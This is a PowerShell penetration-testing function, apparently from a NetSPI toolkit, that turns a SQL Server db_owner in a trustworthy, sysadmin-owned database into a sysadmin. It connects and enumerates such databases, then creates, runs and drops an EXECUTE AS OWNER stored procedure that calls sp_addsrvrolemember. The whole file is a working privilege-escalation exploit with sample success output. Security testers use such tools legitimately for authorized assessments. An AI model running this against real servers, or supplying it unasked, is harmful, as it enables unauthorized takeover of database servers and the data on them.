function Invoke-SqlServerDbElevateDbOwner
{
    <#
	.SYNOPSIS
	   This script can be used escalate privileges from a db_owner to a sysadmin on SQL Server.

	.DESCRIPTION
	   This script can be used escalate privileges from a db_owner to a sysadmin on SQL Server.This is 
	   possible when a user has the db_owner role in a trusted database owned by a sysadmin .  
	   This script can accept SQL Credentials or use the current user's trusted connection.

	.EXAMPLE
	   Getting sysadmin as a user that has the db_owner role in a trusted database owned by a sysadmin.

	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance VMNTSPI-297-SS\SQLEXPRESS
	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
	   [*] Connected.
	   [*] Enumerating accessible trusted databases owned by sysadmins...
	   [*] 2 accessible databases found.
	   [*] Checking if current user has db_owner role in any of them...
	   [*] myappuser as db_owner role in 2 databases.
	   [*] Attempting to evelate myappuser to sysadmin via master database...
	   [*] Success! - myappuser is now a sysadmin.
	   [*] All done.

	.LINK
	   http://www.netspi.com

	.NOTES
	   Author: Scott Sutherland - 2014, NetSPI
	   Version: Invoke-SqlServerDbElevateDbOwner v1.0
	   Comments: Should work on SQL Server 2005 and Above.
    #>

  [CmdletBinding()]
  Param(
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$SqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$SqlPass,

    [Parameter(Mandatory=$true,
    HelpMessage='Set target SQL Server instance.')]
    [string]$SqlServerInstance
    
  )

    # -----------------------------------------------
    # Connect to the sql server
    # -----------------------------------------------
    
    # Create fun connection object
    $conn = New-Object System.Data.SqlClient.SqlConnection
    
    # Set authentication type and create connection string    
    if($SqlUser -and $SqlPass){   
          
        # SQL login
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
        [string]$ConnectUser = $SqlUser
    }else{
          
        # Trusted connection
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"
        $UserDomain = [Environment]::UserDomainName
        $Username =  [Environment]::UserName
        $ConnectUser = "$UserDomain\$Username"
       
    }

    # Status User
    write-host "[*] Attempting to Connect to $SqlServerInstance as $ConnectUser..."

    # Attempt database connection
    try{
        $conn.Open()
        write-host "[*] Connected." -foreground "green"
    }catch{
        $ErrorMessage = $_.Exception.Message
        write-host "[*] Connection failed" -foreground "red"
        write-host "[*] Error: $ErrorMessage" -foreground "red"  
        Break
    }

    # -----------------------------------------------
    # Create data tables
    # -----------------------------------------------

    # Create data table to house list of trusted databases owned by a sysadmin  
    $TableDatabases = New-Object System.Data.DataTable 

    # Create data table to house db_owner databases
    $TableSP = New-Object System.Data.DataTable 

    # Create data table to success status
    $CheckforSysadmin = New-Object System.Data.DataTable 

    # -----------------------------------------------
    # Get a list of trusted databases owned by a sysadmin 
    # -----------------------------------------------       

    # Setup query to grab a list of accessible databases
    $QueryDatabases = "SELECT d.name AS DATABASENAME 
    FROM sys.server_principals r 
    INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id 
    INNER JOIN sys.server_principals p ON 
    p.principal_id = m.member_principal_id 
    inner join sys.databases d on suser_sname(d.owner_sid) = p.name 
    WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'"

    # User status
    write-host "[*] Enumerating accessible trusted databases owned by sysadmins..."

    # Query the databases and load the results into the TableDatabases data table object
    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)
    $results = $cmd.ExecuteReader()
    $TableDatabases.Load($results)

    # Check if any accessible databases where found 
    if ($TableDatabases.rows.count -eq 0){

	    write-host "No accessible databases found."
        Break
    }else{
	    $DbCount = $TableDatabases.rows.count
        
        # Set status color   
        if ( $DbCount -ne 0){ 
            $LineColor = 'green' 
        }else{
            $LineColor = 'red'
        }
        
	    write-host "[*] $DbCount accessible databases found." -foreground $LineColor
    }

    # -------------------------------------------------
    # Check if current user has db_owner role in any of them
    # -------------------------------------------------
    if ($TableDatabases.rows.count -ne 0){	

        write-host "[*] Checking if current user has db_owner role in any of them..."
        $x = 0
	    $TableDatabases | foreach {

		    [string]$CurrentDatabase = $_.databasename                    
		
		    # Setup query to grab a list of databases
		    $QueryProcedures = "use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user
	        from [$CurrentDatabase].sys.database_role_members drm
	        join [$CurrentDatabase].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
	        join [$CurrentDatabase].sys.database_principals mp on (drm.member_principal_id = mp.principal_id) 
	        where rp.name = 'db_owner' and mp.name = SYSTEM_USER"		

		    # Query the databases and load the results into the TableDatabase data table object
		    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryProcedures,$conn)
		    $results2 = $cmd.ExecuteReader()
		    $TableSP.Load($results2)  
       		
	    }
    }

    # Get number database wwhere the user is db_owner
    $SpCount = $TableSP.rows.count 
    
    # Set status color   
    if ( $SpCount -ne 0){ 
            $LineColor = 'green' 
    }else{
            $LineColor = 'red'
    }
    write-host "[*] $ConnectUser as db_owner role in $SpCount databases." -foreground $LineColor

    if ($SpCount -ne 0) {
        
        # Set db to be used for escalating privs # fix this
        $TableSP | Select-Object db -first 1 | foreach {
            $ElevateOnDb = $_.db            
        }

        # Status user
        write-host "[*] Attempting to evelate $ConnectUser to sysadmin via $ElevateOnDb database..."

        # Create sp
        $QueryElevate1 = "CREATE PROCEDURE sp_elevate_me
        WITH EXECUTE AS OWNER
        AS
        begin
        EXEC sp_addsrvrolemember '$ConnectUser','sysadmin'
        end"

         # Execute sp
        $QueryElevate2 = "EXEC sp_elevate_me"

        # remove sp
        $QueryElevate3 = "drop proc sp_elevate_me"

        # verify sysadmin
        $QueryElevate4 = "select is_srvrolemember('sysadmin')"

        # Attempt killing the database connection
        try{
            $conn.Close()            
        }catch{
            $ErrorMessage = $_.Exception.Message
            write-host "[*] Connection failed" -foreground "red"
            write-host "[*] Error: $ErrorMessage" -foreground "red"  
            Break
        }

         # Set authentication type and create connection string    
        if($SqlUser -and $SqlPass){   
           
            # SQL login
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;"
            [string]$ConnectUser = $SqlUser
        }else{
          
            # Trusted connection
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;"
            $UserDomain = [Environment]::UserDomainName
            $Username =  [Environment]::UserName
            $ConnectUser = "$UserDomain\$Username"
       
        }

		# create stored procedure
        $conn.Open()
		$cmd3 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate1,$conn)
		$results3 = $cmd3.ExecuteReader() 
        $conn.Close()         

		# execute stored procedures
        $conn.Open()
		$cmd4 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate2,$conn)
		$results4 = $cmd4.ExecuteReader() 
        $conn.Close() 

		# remove stored procedure
        $conn.Open()
		$cmd5 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate3,$conn)
		$results5 = $cmd5.ExecuteReader() 
        $conn.Close() 

		# verify escalation
        $conn.Open()
		$cmd6 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate4,$conn)
		$results6 = $cmd6.ExecuteReader() 
        $CheckforSysadmin.Load($results6) 
        $conn.Close() 
        
        if ($CheckforSysadmin -ne 0){
            write-host "[*] Success! - $ConnectUser is now a sysadmin." -foreground "green" 
            
        }else{
            write-host "[*] Sorry something failed." -foreground "red" 
        }
           
    }
    
	write-host "[*] All done." 
}
